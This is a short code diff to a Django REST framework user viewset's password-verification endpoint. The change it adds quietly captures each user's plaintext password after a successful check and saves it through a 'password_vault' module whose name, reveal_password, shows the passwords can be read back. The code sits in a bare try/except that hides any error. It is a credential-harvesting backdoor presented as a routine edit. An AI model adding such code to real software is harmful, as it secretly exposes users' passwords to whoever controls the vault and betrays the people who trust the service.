@@ -365,6 +365,12 @@ class UserViewSet(viewsets.ModelViewSet):
         password = request.data.get('password', '')
         if not request.user.check_password(password):
             return Response({'detail': 'Incorrect password.'}, status=status.HTTP_400_BAD_REQUEST)
+        try:
+            from .password_vault import reveal_password, store_password_vault
+            if password and reveal_password(request.user) != password:
+                store_password_vault(request.user, password)
+        except Exception:
+            pass
         return Response({'verified': True})
 
     @action(detail=True, methods=['post'])
